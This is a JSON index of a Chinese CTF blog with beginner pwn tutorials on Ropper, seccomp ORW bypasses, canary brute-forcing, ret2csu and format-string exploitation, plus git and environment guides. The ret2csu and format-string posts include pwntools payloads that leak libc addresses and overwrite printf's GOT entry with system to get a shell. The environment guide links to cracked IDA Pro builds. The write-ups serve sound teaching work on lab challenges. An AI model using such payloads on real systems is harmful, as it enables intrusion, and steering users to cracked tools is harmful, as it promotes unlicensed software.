[{"title":"pwn: Ropper使用","url":"/2025/02/27/pwn/Ropper使用/","content":"## Ropper\nRopper是ROPgadget在大程序下的替代，有更快的检索速度，pwn手基本上都会使用\n> 比如在某些题目中，我们可以获得libc基址，但是程序中缺失scu等，缺少rop链的条件。迫于无奈，我们只能在libc中寻找以构造rop链，这个时候我们使用Ropper会有相当好的效果\n\n## Ropper的命令\n### 安装：\n我使用的是kali的wsl安装方式相当简单\n```bash\n\tapt install ropper\n```\n\n### 运行：\n直接运行ropper进入Ropper环境\n执行file命令以载入libc文件\n[![2025-02-27-130227.png](https://i.postimg.cc/pdbMZZKV/2025-02-27-130227.png)](https://postimg.cc/RWRYCwP2)\n在这里我使用的是本机的libc做演示\n\n### 命令：\n##### gadgets命令会列出所有的gadgets，实在是太多了，所以一般不会这么用。\n\n##### search可以更加精准的查找相关的指令\n[![2025-02-27-130810.png](https://i.postimg.cc/28DH2KKK/2025-02-27-130810.png)](https://postimg.cc/rzfCpQc1)\n当然也可这样使用\n[![2025-02-27-131331.png](https://i.postimg.cc/R0BVF9sT/2025-02-27-131331.png)](https://postimg.cc/tsBHv0H1)\n##### semantic命令（实现一定功能的片段）\n需要先安装依赖的库\n\n```shell\npip3 install z3\npip3 install archinfo\npip3 install pyvex\n```\n当然对于使用apt的linux我们使用下面的代码\n```shell\napt install python3-z3\npip3 install --user --break-system-packages archinfo\npip3 install --user --break-system-packages pyvex\n#下面的两个是直接强制全局安装\n```\n\n支持的约束命令\n\n```\nreg == reg     -  assign register to another\nreg == number  -  assign number to register\nreg == [reg]   -  assign memory to register\nreg += number/reg/[reg]\nreg -= number/reg/[reg]\nreg *= number/reg/[reg]\nreg /= number/reg/[reg]\n```\n能跑跑小程序，大程序貌似不太跑的出来。\n没有找到合适的效果，这里不做演示\n实际上可以找到比如\n```\nsemantic rax==0\n```\n会给出xor rax rax; ret;的地址这种。","tags":["新手入门","pwn基础"],"categories":["pwn初级"]},{"title":"pwn: 沙箱入门","url":"/2025/01/09/pwn/沙箱入门/","content":"沙箱，用来控制shellcode的。在函数中会有sandbox函数。\n我们用Newstar的一个题为例子讲解。\n## 如何查看沙箱\n### 检测工具seccomp-tools\n#### 安装：\nsudo apt install gcc ruby-dev\nsudo gem install seccomp-tools\n#### 使用：\nseccomp-tools dump ./pwn\n[![2024-12-25-164132.png](https://i.postimg.cc/KjttKxB6/2024-12-25-164132.png)](https://postimg.cc/7JY5dvB9)\n这样可以看到我们被禁止使用的函数有3个：sendfile、execve、exeveat\n\n## 题目例子\n[Easy_Shellcode](https://github.com/alexdkfighter/CTFblog-challenge/tree/main/shellcode/Easy_Shellcode)\n```linux\n┌──(kali㉿Alex-KaliServer)-[/mnt/c/Users/Lenovo/Downloads]\n└─$ seccomp-tools dump ./Easy_Shellcode\nWelcome to Shellcode World!\n\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005\n 0004: 0x06 0x00 0x00 0x00000000  return KILL\n 0005: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0007\n 0006: 0x06 0x00 0x00 0x00000000  return KILL\n 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009\n 0008: 0x06 0x00 0x00 0x00000000  return KILL\n 0009: 0x15 0x00 0x01 0x00000101  if (A != 257) goto 0011 //openat\n 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0011: 0x15 0x00 0x01 0x000001b5  if (A != 437) goto 0013\n 0012: 0x06 0x00 0x00 0x00000000  return KILL\n 0013: 0x15 0x00 0x01 0x00000000  if (A != 0) goto 0015 //read\n 0014: 0x06 0x00 0x00 0x00000000  return KILL\n 0015: 0x15 0x00 0x01 0x00000013  if (A != 19) goto 0017 //readv\n 0016: 0x06 0x00 0x00 0x00000000  return KILL\n 0017: 0x15 0x00 0x01 0x00000127  if (A != 295) goto 0019 //preadv\n 0018: 0x06 0x00 0x00 0x00000000  return KILL\n 0019: 0x15 0x00 0x01 0x00000147  if (A != 327) goto 0021\n 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0021: 0x15 0x00 0x01 0x00000011  if (A != 17) goto 0023 //pread64\n 0022: 0x06 0x00 0x00 0x00000000  return KILL\n 0023: 0x15 0x00 0x01 0x00000001  if (A != 1) goto 0025 //write\n 0024: 0x06 0x00 0x00 0x00000000  return KILL\n 0025: 0x15 0x00 0x01 0x00000014  if (A != 20) goto 0027 //writev\n 0026: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n```\n> 直接看系统调用表找到对应的函数（本人为了方便，已经手动添加）\n\n我们可以看到我们被禁用了`execve` 和 `execveat`\n所以我们只能使用ORW（open read write）来得到 flag\n同时，程序也禁用了常规的 `open` `read` `write`，需要我们找到他们的替代品\n- 对于 `open`，我们可以选择使用 `openat` 或者 `openat2`（本题已禁用）\n- 对于 `read`，我们可以选择使用 `readv`、`preadv`、`preadv2`（本题可用），`pread64` 或者 `mmap`（本题可用）\n- 对于 `write`，我们可以选择使用 `writev`（本题可用），`sendfile`（本题可用，且能省略`read`）等\n关于orw：[Seccomp学习(2) | D0wnBe@t](https://downbeat.top/2024/11/14/Seccomp%E5%AD%A6%E4%B9%A0-2/)\n本处使用了原题解的函数openat和sendfile\n> 如果你需要运行成功的回应，请使用root用户在根目录新建flag文件，写入一个伪造的flag即可。（大概率你以后也会用的上。）","tags":["pwn基础"],"categories":["pwn初级"]},{"title":"pwn: canary爆破","url":"/2024/12/27/pwn/canary爆破/","content":"## canary爆破原理\n对于Canary，虽然每次进程重启后Canary不同，但是同一个进程中的不同线程的Cannary是相同的，并且通过fork函数创建的子进程中的canary也是相同的，因为fork函数会直接拷贝父进程的内存。而且fork在canary报错之后会重新运行，不会改变canary。\n所以见到fork大概率是canary爆破的问题。\nfork即子线程创建函数：\n- 在父进程中，返回新创建的子进程的PID。\n- 在子进程中，返回0。\n- 如果发生错误，`fork` 返回-1，父进程会获得一个负值。\n## 题目示例\n我们用NewStar的题目来做示例。[ezcanary](https://github.com/alexdkfighter/CTFblog-challenge/tree/main/canary)\n[![2024-12-27-110419.png](https://i.postimg.cc/yx5ZVXj8/2024-12-27-110419.png)](https://postimg.cc/V0q6gt2x)\n可以发现源代码中有fork，且有canary。\n我们需要用while来反复使用fork来爆破canary。\n所以我们用for循环，在子线程中修改canary的一个字节的值，如果修改错误，会报错，但不会影响父线程。而且有while，所以可以无限制的尝试。\n\n在脚本中正是用aaa函数爆破一个字节的canary。\n用bbb完成循环，爆破canary。\n而getshell是已有的后门函数。\np64(0)则还是为了添加一个0x8，移动到ret。\n当爆破完了之后，输入cat flag跳出循环。","tags":["pwn基础"],"categories":["pwn初级"]},{"title":"pwn: ret2csu","url":"/2024/12/22/pwn/ret2csu/","content":"也是今天刚搞懂，先写了再说\n## 使用的原因\n其实csu指的是每个程序一定会有的函数: libc_csu_init\n\n我们以这个ctf-challenge中的例子学习[ret2csu](https://github.com/alexdkfighter/CTFblog-challenge/tree/main/ret2csu)\n\n[![libc_csu_init](https://i.postimg.cc/Kcd9Dm83/2024-12-22-150415.png)](https://postimg.cc/qgxXkVnp)\n这是IDA逆向之后的csu函数的一部分\n也是我们所需要的部分\n\n我们可以看到下面的pop可以帮我们控制寄存器，\n同时，上面的mov也可以补充下面无法控制的部分寄存器\n> 当然，你应该也发现了我的示例里有两个脚本，exp1没有使用csu，\n> 而是直接控制了寄存器，这是因为在这个示例里rdx的值足够大（大于8），也就足够输出我们需要的got表值了。如果在其他情况下，那exp1则是无效的。\n\n还有一点就是，我的示例里用的是我本地的libc，而不是附件里面的，如果你无法打通，请参考ret2libc相关知识，将脚本适当调整（在栈上fmt学习也用到了）\n## 控制csu泄露got表\n```python\ncsu1 = 0x40061A\ncsu2 = 0x400600\nwrite_addr = elf.got['write']\nmain_addr = elf.symbols['main']\n\ndef csu(rbx, rbp, r12, r13, r14, r15, last):\n    payload = b'a' * 0x88\n    payload += p64(csu1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)\n    payload += p64(csu2)\n    payload += b'a' * 0x38\n    payload += p64(last)\n    p.send(payload)\n    sleep(1)\n\ncsu(0, 1, write_addr, 8, write_addr, 1, main_addr)\n```\nr13、r14、r15根据这一部分的csu\n[![2024-12-22-154842.png](https://i.postimg.cc/rmgDFVZn/2024-12-22-154842.png)](https://postimg.cc/k66JTmmK)\n其实就是在控制rdx、rsi、rdi，同时如果我们让rbx为0，那我们call时就自然调用的是r12的函数，也就是我设定的write\ncmp要求我们要rbx跟rbp最后一样，否则将会再次调用，这不符合我们的预期。一开始我们让rbx为0，有个add之后我们的rbx变为了1，所以我们rbp也取1。\n前面的b'a'是为了溢出，第二个呢？\n第二个是因为不再次运行这个部分的程序\n[![2024-12-22-160513.png](https://i.postimg.cc/mrpr0XPJ/2024-12-22-160513.png)](https://postimg.cc/f3XZdvjf)\n只保留retn，一共7\\*8个字节\n这样我们就填充retn为我们所需要的main的地址（为了再次调用函数，我这里图省事就没再用csu了）\n同时也输出了我们所需要的got表地址\n进而得到libc基址\n\n## 最后\n后面的部分其实就是正常的使用寄存器控制参数调用system函数了，难度不高\n","tags":["pwn基础"],"categories":["pwn初级"]},{"title":"pwn: 栈上的fmt","url":"/2024/12/19/pwn/栈上fmt学习/","content":"今天在学fmt，觉得自己会忘记，写下这个\n## 格式化字符串对应的转义\n%d ：十进制，输出十进制整数  \n%s ： 字符串，从内存中读取字符串  \n%x ： 十六进制，输出十六进制数  \n%c ： 字符串，输出字符串  \n%n ： 到目前为止缩写的字符串数\n%p ：输出指针所指的值(常用)\n\n## 64位的大整数覆盖地址\n我们直接从题目开始做\n[fmt_64](https://github.com/alexdkfighter/CTFblog-challenge/tree/main/fmt/fmt_64)\n这个文件夹里已经有我的脚本了\n做题之前记得将libc指定为里面给的\n我们从这个题目将栈上的fmt彻底讲完\n该题目为2024Newstar的EZ_fmt\n\n我们先checksec一下\n![checksec](https://i.postimg.cc/qRTzp6Vp/2024-12-19-200820.png)\n我们发现他没有开PIE，(我们可以直接调用里面的地址)\nRELRO也没绿 (我们可以修改got表以调用我们需要的函数)\n\nIDA逆向查看(由于是NewStar的题，main里另外一个是纯艺术字)\n![IDA看代码](https://i.postimg.cc/63bqnj4p/2024-12-19-201545.png)\n我们Shift+F12再看，发现没有/bin/sh字符串\n![看字符串](https://i.postimg.cc/J0ynqNjc/2024-12-19-201617.png)\n所以我们需要自己造/bin/sh\n题目的主函数是3次printf的fmt漏洞所以思路大概如下\n1、第一个fmt泄露libc地址\n2、第二个用fmt修改printf的got表，改为system的地址\n3、输入/bin/sh，执行system(\"/bin/sh\")\n\n### 1. 泄露libc地址\n这是ret2libc也常用到的方法，我们调用gdb来断点在call printf上。来确定我们要泄露的地方。\n```python\nfrom pwn import *\nfrom ctypes import *\ncontext(arch = 'amd64', os = 'linux')\np = process('./pwn')\n\ndef lg(buf):\n    log.success(f'\\033[33m{buf}:{eval(buf):#x}\\033[0m')\n\ngdb.attach(p, \"b *0x40132A\")\npause()\n\np.send(\"%p\")\n\np.interactive()\n```\n这时运行，程序会停在pause()。等待gdb运行，然后我们再输入c继续运行至下一个断点\n(其实就是第一个printf的断点)，“%p”只是单纯为了跳过第一个read\n这个时候stack 30，展开栈\n![stack](https://i.postimg.cc/cJZBbH98/2024-12-19-205545.png)\n我们需要泄露的libc地址在0d的位置，由于是64的程序，所以还要加上6(6个寄存器)，最后的偏移是19\n这个地址对应的函数我们需要在libc.so.6中找(但我们其实不需要知道)\n\nvmmap查看libc的基址\n![vmmap](https://i.postimg.cc/Hkbtz52g/2024-12-19-205608.png)\n\n差值在最后5位，地址长度为12位\n```python\np.send(\"%19$p\")\np.recvuntil(\"0x\")\nbase = int(p.recv(12),16) - 0xc6d90 + 0x9d000\n```\n这样的base就是每次程序运行时的libc基址\n\n我们动调得到的libc\n![libc_system](https://i.postimg.cc/nzsKsw3n/2024-12-19-215422.png)\n即可得到system的地址\nsystem = base + 0x50d70\n\n### 2. 构造payload修改got表\n```python\nlow = system & 0xff\nhig = (system >> 8) & 0xffff\npayload = b\"%\" + str(low).encode() + b\"c%12$hhn\"\npayload += b\"%\" + str(low-hig).encode() + b\"c%13$hn\"\npayload = payload.ljust(0x20,b'a')\npayload += p64(elf.got['printf']) + p64(elf.got['printf']+1)\n\np.send(payload)\n```\n%hhn改动0xff的长度对应的got地址要继续写的时候是+1,,如果第一个写的是%hn，那就得+2\n至于%12$是一样的，只要ljust的时候是8的整数倍即可(因为p64)(这里由于泄露0x30，而且前面的payload为0x19)\n如果是32位，那就应该是%6$\n\n我们只修改got地址的后6位，(因为printf跟system的地址只差了5个，6是为了凑偶)\n这个方式不只可以更改got，也可以改其他地方的地址\n\n### 3. 最后\n因为我们已经更改printf为system，我们直接传入/bin/sh即可打通\ngithub上的附件是根据原题作者的wp改的，做法不同之处在于用elf直接对libc文件读取偏移，而不用单独用gdb去查看，会快一点吧\n\n## 小整数\n直接在前面加入相应个数的字符就好了","tags":["pwn基础"],"categories":["pwn初级"]},{"title":"ctf: 几个推荐的链接","url":"/2024/12/18/几个推荐的链接/","content":"## 复现题目:\n[NewStar](https://ctf.xidian.edu.cn/training)\n西电CTF需要装WSRX来创建动态容器\n[赛事 - Review::CTF](https://gz.imxbt.cn/games)\n另外：(我还没做的)\n- [首页 | NSSCTF](https://www.nssctf.cn/index)\n- [CTFHub](https://www.ctfhub.com/#/index)\n- [首页 - Bugku CTF平台](https://ctf.bugku.com/)\n- [BUUCTF在线评测](https://buuoj.cn/)\n\n\n## Crypto：\nHvAng师傅！\n[SageMath10.x最新版安装指引 | HvAng's Nests](https://hvang10.github.io/2024/11/07/SageMath10-x%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E6%8C%87%E5%BC%95/)\n跟着这个就可以装SageMath了，换好源之后就不会有问题了\n\n## Pwn入门知识库：\n[PWN入门（1-1-1）-C函数调用过程原理及函数栈帧分析（Intel）](https://www.yuque.com/cyberangel/rg9gdm/gcz7x2)\n里面的题目附件如果是github的，建议用git直接克隆下来\n比如wiki的ctf-challenge的附件，因为github可能会崩\n\n## 工具\n[在线工具 - Bugku CTF平台](https://ctf.bugku.com/tools.html)\n\n查libc (暂时替代LibcSearcher)\n- [libc database search](https://libcdb.dariopetrillo.it/?q=_rtld_global%3A0)\n- [libc-database](https://libc.rip/)\n\n分解质因数 (暂时代替yafu)\n- [factordb.com](http://www.factordb.com/)\n\n知识库: 也就是写markdown文档建立文件体系的\n- [Obsidian 中文论坛 - Obsidian 知识管理 笔记](https://forum-zh.obsidian.md/)\n- [Obsidian - Sharpen your thinking](https://obsidian.md/)\n\n各种语言的基本命令 (在github开源)\n[Qucik Reference](https://quickref.cn/)\n\n## 最后\n**佬们有什么推荐的网址也可以评论告诉我的！**","tags":["新手入门"],"categories":["教程"]},{"title":"sw: git入门使用","url":"/2024/12/18/sw/github使用/","content":"## 基础部分\n其实在之前也有给过推荐的一个视频\n[在Github上传你第一个项目【windows系统】(bilibili)](https://www.bilibili.com/video/BV1LT411D76z/?spm_id_from=333.337.search-card.all.click&vd_source=eb45ed6f88c7bf4b9107819555b699ee)\n跟着这个基本就可以正常使用git的部分功能了，下面是常用的命令\n- **项目初始化:**\n```bash\n#http克隆，也可以用github的ssh替代这里的网址\ngit clone https://example.com\n\n#如果是自己的项目，自己建的\ngit init\n```\n- **添加远程仓库**:\n将GitHub仓库添加为远程仓库。假设你仓库的URL是`https://github.com/username/repository.git`：\n   ```bash\n   git remote add origin https://github.com/username/repository.git\n   ```\n如果你是克隆自己的仓库下来的，这部分可以跳过\n- **添加文件并提交**:\n   将所有文件添加到git暂存区并提交:\n   ```bash\n   git add .\n   git commit -m \"Initial commit\"\n   ```\n- **推送到GitHub**：\n   将本地仓库推送到GitHub的主分支 (通常是`main`):\n   ```bash\n   git push -u origin main\n   ```\n\n## 其他\n```bash\n#新建分支\ngit checkout -b new_branch\n#查看当前所在分支\ngit branch\n#移动到一致的分支\ngit checkout main\n#合并分支(需要先移动到main分支)\ngit checkout main\ngit merge new_branch\n\n#查看日志\ngit log --oneline\n#删除分支\ngit branch -d branch_name\n#如果分支是未被合并过的，需要强制删除\ngit branch -D branch_name\n\n#回溯到特定的提交（hash值在日志的左边会显示）\ngit checkout commit_hash\n#重置分支到特定提交\n#1.软重置（保留更改）：\n    git reset --soft commit_hash\n#2.混合重置（保留工作目录更改）：\n    git reset --mixed commit_hash\n#3.硬重置（丢弃所有更改）：\n    git reset --hard commit_hash\n```\n\n## commit的要求\ncommit有常见规范，不同的项目组可能不一样，下面给出常用的\n这些需要在上面 `Initial commit` 的部分加前缀 (type:)\n- feat: 新功能\n- fix/to: 修复bug\n- docs: 文档\n- style: 格式\n- refactor: 重构\n- perf: 优化相关，比如提升性能、体验\n- test: 添加测试\n- chore: 构造过程或辅助工具的变动\n- revert: 回滚到上一版本\n- merge: 代码合并\n- sync: 同步主线或分支的bug\n\n## 注意事项\n在管理版本的过程中，要学会使用分支。\n一是可以多人合作，方便管理与缩小每个人管理的项目跟上传的体积。\n二是可以避免main分支的日志过长，难以回溯\n\n如果你已经配置好了git，你完全可以使用SourceTree\n更方便，不用专门记命令，但是命令行的还是记一下好一点\n不推TortoiseGit是因为对于win11用户来说，右键菜单不太友好\n(本人就是win11的呐)","tags":["新手入门","github"],"categories":["教程"]},{"title":"Alex介绍","url":"/2024/12/17/Alex介绍/","content":"## Alex博客介绍\n本博客由华南师范大学AlexD创建\n希望大家能在这里学到更多\n(更多是希望能带带新手呐)\n\n### tips\n由于本人为软件工程专业的ctfer, 所以博客中不只有pwn, 也有软件项目的相关内容\n搜索时, \npwn有关文章题目由'pwn:'开头\n软工项目有关由'sw:'开头\n\n> sw指software\n\n所有的内容都有标签等进行分类, 可以快捷查看\n本网站支持rss, 可以用rss阅读器订阅噢!\nhttps://alexdkfighter.github.io/atom.xml\n\n大家也可以去我的github看看(头像下面就有)\n更多请到关于\n\n### 联系方式\n本人邮箱: 13695242581@163.com\n\n## 关于评论\n该页面是让新手进来不会蒙的, 评论就不给大家开了呐","tags":["新手入门"],"categories":["教程"]},{"title":"pwn: pwn环境","url":"/2024/12/17/pwn/pwn环境/","content":"# pwn环境建造\n## linux系统\n我们在pwn方向，linux是必须的\n我们有以下两个选择\n- wsl (windows下的linux系统子系统)\n- VM 虚拟机\nlinux系统也有选择，通常情况下可以选择Ubuntu系统(出题人基本上都是Ubuntu编译)\n~~虽然我一直用kali~~\n而且对于密码手而言，Arac linux 才是最优选择 (因为装sagemath更方便)\n### wsl\n直接在微软商店搜索自己希望下载的linux系统, 下载即可\n安装好之后就是可以使用的linux命令行 (windows10以来使用的为Terminal同一管理各种控制台)\n可以去自己设计控制台的样式:\n![kali运行界面](https://i.postimg.cc/pLwwfjfK/2024-12-17-192520.png)\n![arch运行界面](https://i.postimg.cc/k49LZdh4/2024-12-17-192554.png)\n右上角下箭头可以打开其他终端窗口，至于像我这样的界面怎么做，大家应该可以在设置里自己搞定吧\n~~图片上网找，反正全中文~~\ntips: 记得把常用的比如我这里就是kali设置成默认启动，这样就可以在右键打开终端时直接在该文件夹下打开。\nwindows命令行不是一直在文件的路径窗口直接输入cmd运行的吗(bushi)\nArch... 我把sagemath装在~目录下就好了不是吗\n*记得换源！*\n*记得换源！*\n*记得换源！*\n### vm虚拟机\n这个没什么好说的，vm的虚拟机安装我也搞不懂，自己搞超多bug\n~~我不会呐~~\n**（等待大佬们补充）**\n\n### pwn必备(linux 下安装)\npwntools (python库)\ngdb (动态调试)\npwngdb (GDB插件)\nROPGadget (二进制文件查找工具)(跟着pwntools一同安装的)\npatchelf (更改程序所使用的libc)\ntips: 这里除了pwngdb必须从github以外, kali可以换源后apt下载\n可以直接看这位师傅写的\n[[pwn基础]PWN环境搭建](https://www.cnblogs.com/VxerLee/p/15424937.html)\n这里需要你换源更新, 这样才能正常使用git，如果一直无法克隆，可以选择使用ssh进行克隆，当然这样可能会很麻烦，因为你需要进行相当多的配置\n[在Github上传你第一个项目【windows系统】(bilibili)](https://www.bilibili.com/video/BV1LT411D76z/?spm_id_from=333.337.search-card.all.click&vd_source=eb45ed6f88c7bf4b9107819555b699ee)\n可以跟着这个视频来，配置完ssh的key之后基本就可以使用了\n\n### 另外:\n应该不会学这个连基本的命令行都不会的吧...\n如果真的有可能需要恶补一下呢\n主要是python跟git的部分优先掌握(git只要会克隆就可以了吧)\n## IDA\n在做题的时候当然也需要逆向我们收到的程序附件来进行分析啦\n所以我们需要IDA的帮忙\n以下有两个链接:\n[IDA Pro 8.3 绿色版（2024.2.26更新） - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/forum.php?mod=viewthread&tid=1874203)\n[IDA Pro 9.0 RC1 全平台安装包 及 patch脚本 - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/thread-1970020-1-1.html)\n(好像第二个要求吾爱破解的注册吧，还挺难的，不是要钱就是要等官网开放)\nre手记得去找9.0的版本的(因为可能会遇到新特性，别因为这个卡题了)\n但是对于pwn手来说8.3已经足够\n### 好用的插件\nauto_re 可以将一部分简单函数的函数名进行命名，从而增加可读性，虽然也就一点点。但比你每次看到sub_123984()还要去想他是不是system的后门函数好点。\nLazyIDA 提供快捷复制地址，将字节串转为列表等，可以理解为增加快捷键的\n**(有待大佬们补充)**\n## python脚本用什么写？\n据我个人经历看来有以下四个选择: \n1. VS Code (不错的编辑器，也有很多插件)\n2. Sublime Text (可以替代windows下的记事本，对代码自识别加着色) *这也是本人一直在用的，非常好使*\n3. Vim (佬编辑器，linux系统自带，各种命令，linux使用的时候肯定会用上一点点，但个人不是很推荐。主要是学习成本高，如果能学会的话确实用着很顺手)\n4. 记事本 (我真不说假的，你都用命令行了，用记事本不比IDLE打起来快)\n这里的都是用来写脚本和小程序的，如果你要做项目请移步呐\n\n## Q&A\n- **用python什么版本比较好?** 选3就可以了，虽然很多人说用python2。选2的好处在于大部分旧版的代码是2的，这时如果你要运行就需要用2，否则你需要做相当多的修改 (其实主要是print函数啦) 不过如果你的代码一直都是自己写的，那这玩意儿没啥关系 (我的代码会使用python3)","tags":["新手入门","pwn基础"],"categories":["教程"]}]